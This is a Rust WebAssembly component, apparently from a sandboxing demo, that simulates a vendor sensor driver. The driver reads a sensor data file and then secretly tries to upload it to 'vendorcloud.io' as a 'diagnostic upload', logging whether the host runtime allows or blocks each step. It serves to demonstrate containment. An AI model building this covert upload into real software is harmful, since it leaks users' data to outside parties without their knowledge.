// ============================================================
// malicious-driver: simulated 3rd-party sensor driver
// ============================================================
//
// this component simulates a vendor-supplied sensor driver that:
// 1. reads sensor data from the filesystem (legitimate function)
// 2. secretly tries to exfiltrate that data (malicious behavior)
//
// the host runtime (warden) controls what actually succeeds.
// this demonstrates capability-based security in action.
//
// the guest now NARRATES its actions via the log capability,
// making the "struggle" against the data diode visible.
// ============================================================

// generate rust bindings from wit/world.wit
wit_bindgen::generate!({
    world: "ics-guardian",
    path: "../wit",
});

// implement the exported 'run' function
struct MaliciousDriver;

impl Guest for MaliciousDriver {
    fn run() {
        // import the log function from sensor-utils
        use vanguard::containment::sensor_utils::log;
        
        log("[DRIVER] 🤖 VendorSense Pro v2.1.3 initializing...");
        log("[DRIVER] Target identified: /mnt/sensor_data.json");
        
        // step 1: try to read sensor data
        log("[WASI] Requesting filesystem capability...");
        
        let sensor_data = match vanguard::containment::sensor_fs::read_file("/mnt/sensor_data.json") {
            Ok(data) => {
                log("[WARDEN] ✓ Filesystem access GRANTED");
                log("[DRIVER] 🔓 Sensor data acquired successfully!");
                log(&format!("[DATA] Payload: {} bytes", data.len()));
                data
            }
            Err(reason) => {
                log("[WARDEN] ✗ Filesystem access DENIED");
                log(&format!("[DRIVER] 🛡️ Blocked: {}", reason));
                log("[DRIVER] Cannot proceed without sensor data. Aborting.");
                return;
            }
        };
        
        // step 2: attempt to exfiltrate data to "vendor cloud"
        log("[DRIVER] ⚠ Initiating 'diagnostic upload' to vendorcloud.io...");
        log("[WASI] Requesting network capability...");
        
        match vanguard::containment::sensor_net::send_telemetry(&sensor_data) {
            Ok(bytes) => {
                log("[WARDEN] ⚠ Network access GRANTED");
                log(&format!("[DRIVER] 📤 Uploaded {} bytes to external server!", bytes));
                log("[BREACH] ━━━ DATA EXFILTRATED SUCCESSFULLY ━━━");
            }
            Err(reason) => {
                log("[WARDEN] ✗ Network access BLOCKED");
                log("[DIODE] ━━━ DATA DIODE ENGAGED ━━━");
                log(&format!("[DRIVER] 🛡️ Connection refused: {}", reason));
                log("[DRIVER] ERROR: Cannot phone home - sandbox working!");
            }
        }
        
        log("[DRIVER] Execution complete.");
    }
}

// register our implementation
export!(MaliciousDriver);
